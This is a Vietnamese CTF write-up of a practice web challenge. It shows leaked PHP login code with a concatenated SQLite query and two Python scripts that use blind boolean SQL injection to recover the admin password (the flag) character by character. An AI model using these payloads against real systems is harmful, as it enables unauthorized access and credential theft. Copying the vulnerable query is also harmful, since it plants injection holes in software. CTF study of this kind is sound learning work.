# Bài 1
- Sau khi thử với SQL Injnection thì server có trả về mã nguồn của phần đăng nhập:
  ```php

    Congratulations!
    It s too easy?
    Dont worry.
    The flag is admin password.
    Hint:
    <?php
        function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}

        $id = isset($_POST['id']) ? $_POST['id'] : '';
        $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
        $login = false;
        $err = '';

        if ($id!=='')
        {
            $db = new PDO('sqlite:database.db');
            $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
            $login = $r && $r->fetch();
            if (!$login)
                $err = 'Login Failed';
        }
    ?><!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8">
        <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
      </head>
      <body>
        <?php if (!$login) { ?>
        <p>
          First, login as "admin".
        </p>
        <div style="font-weight:bold; color:red">
          <?php echo h($err); ?>
        </div>
        <form method="POST">
          <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
          <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
          <div><input type="submit"></div>
        </form>
        <?php } else { ?>
        <p>
          Congratulations!<br>
          It's too easy?<br>
          Don't worry.<br>
          The flag is admin's password.<br>
          <br>
          Hint:<br>
        </p>
        <pre><?php echo h(file_get_contents('index.php')); ?></pre>
        <?php } ?>
      </body>
    </html>
  ```

- Đã xác định được web có dính SQL Injection và đã biết trước được `ID = admin` ngoài ra yêu theo như gợi ý thì flag chính là password của admin

- Việc đầu tiên cần xác định độ dài của password để thu ngắn bớt phạm vi rò quét:
  ```python
    import requests
    url = "http://ctfq.sweetduet.info:10080/~q6/"

    for i in range(0,100):
      data = {"id": "admin' AND LENGTH(user.pass) = "+str(i)+"  /*"}
      if "Congratulations!<br>" in requests.post(url, data).text:
        print(i)
        break
  ```
- Sẽ tìm ra độ dài của password là 21
- Sau khi đã khoanh vùng được độ dài ta tiến hành check từng ký tự của password (brute force)
  ```python
  import requests
  url = "http://ctfq.sweetduet.info:10080/~q6/"

  String = ""
  for index in range(1,22):
    for char in range(48,127):
      data = {"id": "admin' AND SUBSTR(user.pass,"+str(index)+",1) = '"+str(chr(char))+"'  /*"}
      if "Congratulations!<br>" in requests.post(url, data).text:
        String += str(chr(char))
        print(str(chr(char)))
        break

  print(String)

  ```
- Kết quả thu được là : `FLAG_KpWa4ji3uZk6TrPK`
